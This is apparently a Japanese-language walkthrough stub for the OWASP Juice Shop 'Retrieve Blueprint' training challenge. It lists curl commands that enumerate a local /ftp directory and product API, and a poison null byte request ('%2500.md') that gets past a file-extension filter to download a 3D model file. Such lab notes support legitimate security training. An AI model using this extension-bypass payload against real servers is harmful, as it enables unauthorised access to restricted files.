# Retrieve Blueprint ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** 機密データ
**目標:** 製品の3Dモデル（設計図）を取得

## ヒント

- **ファイル形式:** STL, OBJ, 3DS などの3Dモデル形式
- **場所:** `/ftp` または API から取得
- **製品:** Juice Shop の商品の設計データ

## 調査方法

```bash
# /ftp ディレクトリを確認
curl http://localhost:3000/ftp/

# 3Dモデル拡張子を検索
curl http://localhost:3000/ftp/ | grep -iE "\.stl|\.obj|\.3ds|\.blend"

# API で製品情報を確認
curl http://localhost:3000/api/Products/
```

## Poison Null Byte で取得

```bash
# .stl ファイルがある場合
curl "http://localhost:3000/ftp/blueprint.stl%2500.md"
```

## 検証ポイント

- [ ] /ftp でファイル一覧を確認
- [ ] 3Dモデルファイルを特定
- [ ] ダウンロードに成功

## 解説

[未着手]
